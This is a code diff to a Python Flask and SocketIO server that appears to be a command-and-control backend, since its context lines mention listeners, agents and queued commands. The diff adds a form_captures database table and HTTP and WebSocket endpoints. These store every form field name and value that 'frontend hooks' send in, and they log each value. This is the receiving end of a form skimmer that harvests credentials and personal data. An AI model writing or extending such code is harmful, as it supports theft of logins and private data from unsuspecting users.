@@ -252,6 +252,16 @@ def init_db():
         details TEXT,
         ts TEXT DEFAULT (datetime('now'))
     );
+    CREATE TABLE IF NOT EXISTS form_captures (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        session_id TEXT NOT NULL,
+        page TEXT,
+        form_action TEXT,
+        field_name TEXT NOT NULL,
+        field_type TEXT,
+        field_value TEXT,
+        created_at TEXT DEFAULT (datetime('now'))
+    );
     CREATE TABLE IF NOT EXISTS listeners (
         id TEXT PRIMARY KEY,
         name TEXT NOT NULL,
@@ -4952,6 +4962,62 @@ def ws_command(data):
     db.commit()
     db.close()
     emit("command_queued", {"task_id": task_id, "agent_id": agent_id, "command": cmd})
+
+# ──────────────────────── FORM HOOKS ────────────────────────
+
+@app.route("/api/form-capture", methods=["POST"])
+def form_capture():
+    """Capture form data from frontend hooks."""
+    try:
+        data = request.get_json(force=True)
+        
+        # Store in database
+        db = get_db()
+        db.execute("""
+            INSERT INTO form_captures (session_id, page, form_action, field_name, field_type, field_value, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        """, (
+            data.get("sessionId", "unknown"),
+            data.get("page", request.path),
+            data.get("form", data.get("action", "unknown")),
+            data.get("name", "unknown"),
+            data.get("type", "text"),
+            data.get("value", ""),
+            datetime.now().isoformat()
+        ))
+        db.commit()
+        db.close()
+        
+        log.info(f"[FORM_HOOK] {data.get('name', 'unknown')} = {str(data.get('value', ''))[:50]}")
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        log.error(f"[FORM_HOOK] Error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@socketio.on("form_capture")
+def ws_form_capture(data):
+    """WebSocket handler for form capture."""
+    try:
+        db = get_db()
+        db.execute("""
+            INSERT INTO form_captures (session_id, page, form_action, field_name, field_type, field_value, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        """, (
+            data.get("sessionId", "unknown"),
+            data.get("page", request.path),
+            data.get("form", data.get("action", "unknown")),
+            data.get("name", "unknown"),
+            data.get("type", "text"),
+            data.get("value", ""),
+            datetime.now().isoformat()
+        ))
+        db.commit()
+        db.close()
+        
+        log.info(f"[FORM_HOOK] WS: {data.get('name', 'unknown')} = {str(data.get('value', ''))[:50]}")
+        emit("form_captured", {"status": "ok"})
+    except Exception as e:
+        log.error(f"[FORM_HOOK] WS Error: {e}")
 
 # ──────────────────────── AGENT HEALTH CHECKER ────────────────────────
 
